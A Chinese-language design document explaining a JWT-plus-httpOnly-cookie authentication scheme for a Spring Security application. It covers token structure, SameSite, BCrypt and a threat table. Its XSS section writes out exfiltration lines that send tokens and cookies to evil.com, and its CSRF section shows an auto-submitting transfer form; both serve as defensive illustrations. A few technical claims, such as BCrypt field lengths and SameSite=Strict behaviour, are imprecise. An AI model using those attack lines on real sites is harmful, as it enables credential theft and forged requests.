# JWT 认证方案技术文档

> 覆盖 JWT 认证的底层原理、安全模型与完整实现链路

## 1. 认证方式选型

### 1.1 核心问题

HTTP 是无状态协议——每个请求独立、服务器不记得"你刚才登录过"。认证的本质就是在无状态协议上建立信任：本次请求来自一个已知用户。

两种根本做法：

| 做法 | 原理 | 代表 |
|------|------|------|
| **服务端存状态** | 用户登录后服务端生成 sessionId → 存 Redis/内存 → 每次请求带 sessionId | HttpSession（传统） |
| **客户端持有凭证** | 服务端签发一个不可伪造的凭证 → 客户端持有 → 每次请求出示 | JWT（本项目） |

### 1.2 为什么选 JWT

项目是前后端分离 + AI 流式输出（SSE）架构，有三条硬约束：

1. **SSE 不支持自定义 Header**：浏览器的 `EventSource` API 只能发 GET 请求且不能加 `Authorization` header。Session Cookie 或 httpOnly Cookie 可以自动携带。
2. **多实例部署未来可能**：无状态 JWT 天然支持水平扩展——不需要 Redis 做 session 集中存储
3. **AI 接口需要限流**：`userId` 从 JWT 直接解析，不必额外查数据库

### 1.3 Token 传输方式

两个选项：

```
方案 A: Authorization Header
  fetch("/api", { headers: { "Authorization": "Bearer <jwt>" } })
  Token 存: localStorage / sessionStorage
  问题: XSS 可读 → token 泄露; SSE 不支持

方案 B: httpOnly Cookie (本项目选择)
  Set-Cookie: token=<jwt>; HttpOnly; SameSite=Lax; Path=/
  Token 存: 浏览器 cookie jar (JS 不可读)
  优势: XSS 偷不走; 浏览器自动带; SSE 支持
```

## 2. JWT 底层原理

### 2.1 结构

JWT 不是加密，是**签名**。加密保护机密性，签名保护完整性。

```
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIiwidXNlcm5hbWUiOiJhZG1pbiJ9.xxx
└────── Header ──────┘ └────────── Payload ──────────┘ └ Signature ┘
       Base64URL              Base64URL                    HS256
```

**Header**：签名算法和 token 类型
```json
{ "alg": "HS256", "typ": "JWT" }
```

**Payload**：声明（Claims）——可以解码阅读，不能篡改
```json
{
  "sub": "1",           // Standard claim: subject (userId)
  "username": "admin",   // Custom claim
  "iat": 1234567890,     // Standard claim: issued at
  "exp": 1234575090      // Standard claim: expiration
}
```

**Signature**：`HMAC-SHA256(header + "." + payload, secret)`

验证过程：服务端取出 Header + "." + Payload 部分，用同样的 secret 重新算签名，和收到的 Signature 比——一致说明未被篡改。secret 只有服务端知道，攻击者改了 payload 算不出正确签名。

### 2.2 HS256 vs RS256

| | HS256 (本项目) | RS256 |
|---|---|---|
| 原理 | 同一个密钥签发+验证（对称） | 私钥签发，公钥验证（非对称） |
| 适用 | 单体/小规模，secret 不泄露即可 | 微服务：签发服务持有私钥，其他服务只拿公钥验证 |
| 密钥管理 | 一个共享 secret | 一对密钥，私钥不能泄露 |

**为什么本项目用 HS256**：当前是单体部署。如果未来拆微服务（如独立的 AI 调度服务），改 RS256 只需要换 `signWith(RS256, privateKey)` 和 `setSigningKey(publicKey)` 两行代码。

### 2.3 Token 过期与续签

JWT 是"签发即有效、到期即失效"的一次性令牌。服务端不存状态 → 无法主动撤销 → 这既是优势也是 trade-off。

当前方案：2 小时绝对过期。未来可扩展为双 token 模式：

```
Access Token  (15min, JWT)     — 每次请求验证
Refresh Token (7day, 随机字符串存 Redis) — 只用来换新 Access Token

过期处理:
  Token 过期 → 401 → 前端用 Refresh Token 换新的 Access → 重试请求
  Refresh Token 也过期 → 跳转登录页
  需要踢人 → 从 Redis 删 Refresh Token
```

## 3. Cookie 安全模型

### 3.1 为什么 httpOnly Cookie 比 localStorage 安全

XSS 攻击的本质是注入脚本在页面上下文执行。攻击者的目标是拿到 token 发给自己的服务器：

```javascript
// XSS 攻击能做的事情:
fetch("https://evil.com/steal?token=" + localStorage.getItem("token"))  // ✅ 能拿到
fetch("https://evil.com/steal?cookie=" + document.cookie)              // ❌ 拿不到 httpOnly
```

httpOnly Cookie 的根本防护点：**浏览器将 cookie 标记为"不允许 JavaScript 访问"**，即使注入脚本，`document.cookie` 也读不到这个值。攻击者无法窃取，就只能放弃凭据窃取这条攻击路径。

### 3.2 SameSite 防 CSRF

CSRF 攻击场景：你在 `bank.com` 登录了（cookie 生效），然后访问了恶意网站 `evil.com`。evil.com 的页面发起一个对 `bank.com` 的 POST 请求——浏览器会自动带上 `bank.com` 的 cookie，导致你的账户被操作。

```
恶意网站 evil.com:
  <form action="https://bank.com/transfer" method="POST">
    <input name="to" value="attacker">
    <input name="amount" value="10000">
  </form>
  // 自动提交 → 浏览器带上了 bank.com 的 session cookie

SameSite=Lax 拦截规则:
  从 evil.com → bank.com 的 POST 请求：❌ 不发送 cookie
  从 evil.com → bank.com 的 GET 请求：  ❌ 不发送 cookie
  从 bank.com 内部导航的 GET 请求：     ✅ 发送 cookie (Lax 例外)
  从 bank.com 页面 fetch 到 bank.com API: ✅ 发送 cookie (同站)
```

因为本项目是前后端分离（localhost:3000 调 localhost:8091），用了 `Lax` 而非 `Strict`——`Strict` 会阻止同站跨子域的 GET 请求带 cookie，影响正常跳转。

### 3.3 Cookie 属性总览

| 属性 | 值 | 作用 |
|------|-----|------|
| `HttpOnly` | true | 禁止 JavaScript 访问 → 防 XSS 窃取 |
| `SameSite` | Lax | 跨站请求不发送 → 防 CSRF；同站 GET 导航仍发送 |
| `Secure` | false (本地) / true (生产) | true 时仅在 HTTPS 连接中发送 → 防中间人嗅探 |
| `Path` | / | 所有路径都发送 |
| `Max-Age` | 7200 | 与 JWT 过期时间一致，cookie 和 token 同步失效 |

## 4. BCrypt 密码哈希原理

### 4.1 为什么不能存明文或简单 hash

```
明文:  password_hash = "admin"      → 数据库泄露 = 全部账号沦陷
MD5:   password_hash = md5("admin") → 彩虹表秒破 (已知 md5("admin") = 21232f297a...)
SHA256: password_hash = sha256("admin") → GPU 每秒算几十亿次，暴力破解
```

### 4.2 BCrypt 如何工作

BCrypt 解决两个问题：**抗暴力枚举**（故意做得很慢）和**自动加盐**（同密码不同 hash）。

```
BCrypt 哈希值结构:
  $2b$12$4FJSjr5m1FG46tfuVIvEl.layKKo1L6LQ5roz1ItOj9UVA2AE7Umm
  └┬┘ └┬┘ └───────────────────┬──────────────────────────┘
  算法  cost  22字节 salt      31字节 hash
  版本  (2^12=4096轮迭代)

验证过程:
  passwordEncoder.matches("admin", hash)
    → 从 hash 中提取: 算法=2b, cost=12, salt=4FJSjr...
    → 用提取的参数对 "admin" 重新哈希
    → 比较结果是否等于存储的 hash
```

**为什么同一个密码两次 hash 不同**：因为两端随机 salt，即使相同的明文密码，每次生成的 salt 不同导致最终 hash 不同。这也意味着无法通过"hash 是否相同"来判断两个用户是否用了一样的密码。

**cost 参数的含义**：`cost=10` 表示 `2^10 = 1024` 轮迭代。每增加 1，计算量翻倍。`cost=10` 在现代 CPU 上约 50-100ms，是安全性和用户体验的平衡点。

### 4.3 错误信息统一

```java
// 无论用户名错还是密码错，返回相同的信息
throw new AppException("0004", "用户名或密码错误");
```

不区分两种错误，防止攻击者通过错误信息枚举有效用户名。

## 5. Spring Security 过滤器链原理

### 5.1 请求处理时序

```
HTTP Request
    │
    ▼
┌──────────────────────────────────────────────────────────────┐
│ SecurityFilterChain (this.http)                               │
│   ├── CORS Filter (allowCredentials, localhost:*)             │
│   ├── SessionCreationPolicy (STATELESS → 不创建 HttpSession)   │
│   ├── CSRF Filter (disabled — API 不需要)                     │
│   ├── ★ JwtAuthenticationFilter (自定义 — 插在 UsernamePw 前面) │
│   │      └─ Cookie 取 token → 验签 → 解析 userId                │
│   │      └─ 构造 Authentication → 注入 SecurityContextHolder    │
│   ├── UsernamePasswordAuthenticationFilter (被跳过)           │
│   ├── AuthorizationFilter                                     │
│   │      └─ 读 SecurityContext 的 Authentication               │
│   │      └─ 匹配 authorizeHttpRequests() 规则                   │
│   │      └─ 有 auth → 放行; 无 auth + 不是 permitAll → 401     │
│   └── ExceptionTranslationFilter (401/403 → Error response)   │
└──────────────────────────────────────────────────────────────┘
    │
    ▼
Controller (AuthUtil.getCurrentUserId() → userId)
```

### 5.2 STATELESS 的含义

```java
http.sessionManagement(session ->
    session.sessionCreationPolicy(SessionCreationPolicy.STATELESS));
```

Spring Security 默认会创建 `HttpSession`（对应 Servlet 规范）。设为 `STATELESS` 后：

- **不再创建 session**：`request.getSession()` 不会自动创建新的 HttpSession
- **不再写入 `JSESSIONID` cookie**：客户端不收到 session cookie
- **`SecurityContextHolder` 仍然工作**：每次请求 filter 重新设置、请求结束自动清空

这意味着每个请求完全独立——认证状态不跨请求保持，完全依赖 JWT 重新建立。

### 5.3 SecurityContextHolder 的存储策略

```java
// 默认策略: ThreadLocal (线程绑定)
SecurityContextHolder.getContext().setAuthentication(auth);
// 请求结束时自动清理 (SecurityContextPersistenceFilter 或 RequestContextFilter)
```

`ThreadLocal` 策略意味着：同一个 HTTP 请求的任意位置调用 `AuthUtil.getCurrentUserId()` 都能拿到同一个 userId，不同请求之间完全隔离。

## 6. 代码架构

### 6.1 DDD 分层

```
Trigger 层 (API 入口 + 安全基础设施)
├── AuthController.java              # login/register/logout
├── SecurityConfig.java              # @EnableWebSecurity + SecurityFilterChain
├── JwtTokenProvider.java            # JWT 签发/解析/验证
├── JwtAuthenticationFilter.java     # Cookie → JWT 解析 → SecurityContext
└── AuthUtil.java                    # getCurrentUserId() 静态方法

Domain 层 (业务规则)
└── account/
    ├── UserEntity.java              # 用户实体 (id/username/passwordHash/nickname)
    ├── IUserRepository.java         # 仓储接口
    └── IUserDomainService.java      # 领域服务接口

Infrastructure 层 (数据访问)
├── UserPO.java                      # 对应 user 表
├── IUserDao.java                    # MyBatis @Select @Insert
└── UserRepository.java              # IUserRepository 实现
```

与现有模块的关系：

```
domain/
├── account/   ← 新建 (用户认证)
├── content/   ← 已有 (草稿/文章)
└── agent/     ← 已有 (AI 写作/画图)
```

三个 bounded context 独立，通过 Controller 层协作：

```java
// ContentDraftController: 将 userId 从 account context 传给 content context
Long userId = AuthUtil.getCurrentUserId();             // ← account context
DraftEntity draft = draftDomainService.saveDraft(userId, command); // ← content context
draftEntity.validateOwner(userId);                     // ← 防越权
```

### 6.2 改造范围

替换 `DEFAULT_USER_ID = 1L` —— 3 个 Controller、11 处调用：

```java
// 改前
public Response<...> saveDraft(@RequestBody SaveDraftRequestDTO req) {
    DraftEntity draft = draftDomainService.saveDraft(DEFAULT_USER_ID, command); // 旧

// 改后
public Response<...> saveDraft(@RequestBody SaveDraftRequestDTO req) {
    Long userId = AuthUtil.getCurrentUserId();                                   // 新
    DraftEntity draft = draftDomainService.saveDraft(userId, command);           // 新
```

Domain 层零改动——所有领域方法签名本来就是 `(Long userId, ...)`。

## 7. 攻击面分析

| 威胁 | 防护 | 原理 |
|------|------|------|
| XSS 窃取 token | httpOnly Cookie | `document.cookie` 读不到 |
| CSRF 利用 cookie | SameSite=Lax | 跨站不发送 cookie |
| 中间人嗅探 | HTTPS (生产) + Secure cookie | 传输层加密 |
| Token 篡改 | JWT 签名验证 | `invalidSignatureException` → 返回 false |
| Token 重放 | 无直接防护 | JWT 是无状态方案的内在 trade-off；可加 jti + Redis 防重放 |
| 水平越权 | `validateOwner(userId)` | 资源操作校验归属 |
| 暴力爆破密码 | BCrypt cost=10 | 单次比对 50-100ms，限制爆破速率 |
| 用户枚举 | 统一错误信息 | 不区分"用户不存在"和"密码错误" |

## 8. 常见追问

**Q: 为什么 JWT payload 放 userId 而不是 username？**

userId 是主键、不可变、唯一且不包含个人信息。username 可能修改，且属于可识别的个人信息——JWT payload 只是 Base64URL 编码（任何人都能解码），不应放敏感信息。

**Q: JWT 为什么不能直接"撤销"？**

JWT 的验证是纯数学运算：拿 header+payload 算出签名和收到的对比。这个过程完全自包含，不依赖任何外部存储。"撤销"需要外部状态（数据库或 Redis），打破了无状态的前提。这是有状态和无状态之间的根本 trade-off。

**Q: 两个小时的过期时间怎么定的？**

安全性和用户体验的平衡。太短（15min）→ 用户频繁掉线；太长（7天）→ token 泄露后窗口期太大。2 小时覆盖一个工作时段，泄露风险可控。配合前端 middleware 的路由守卫，无感跳登录页。

**Q: 什么时候该用 RS256 替代 HS256？**

当你需要把 JWT 签发和验证分离到不同服务时。例如：独立的 Auth 服务签发 token，N 个业务服务验证 token。用 HS256 意味着所有服务共享同一个 secret——任何一个服务泄露 secret 整个集群沦陷。用 RS256 的话，只有 Auth 服务持有私钥，其他服务只拿公钥验证。

**Q: `STATELESS` 模式下 `SecurityContextHolder` 的值什么时候清理？**

Spring Security 的 `SecurityContextPersistenceFilter`（或 `RequestContextFilter`）在请求结束时自动调用 `SecurityContextHolder.clearContext()`。`STATELESS` 模式下这个 filter 默认不生效——但 `SecurityContextHolder` 的存储基于 `ThreadLocal`，当前线程被线程池回收后，如果不清理会导致下一个复用该线程的请求读到旧的认证信息。解决方案：`JwtAuthenticationFilter` 每次无条件注入（验证通过设 userId，验证失败的情况 SecurityContext 为 null 也不影响），或者在 filter 的 finally 中显式调用 `SecurityContextHolder.clearContext()`。
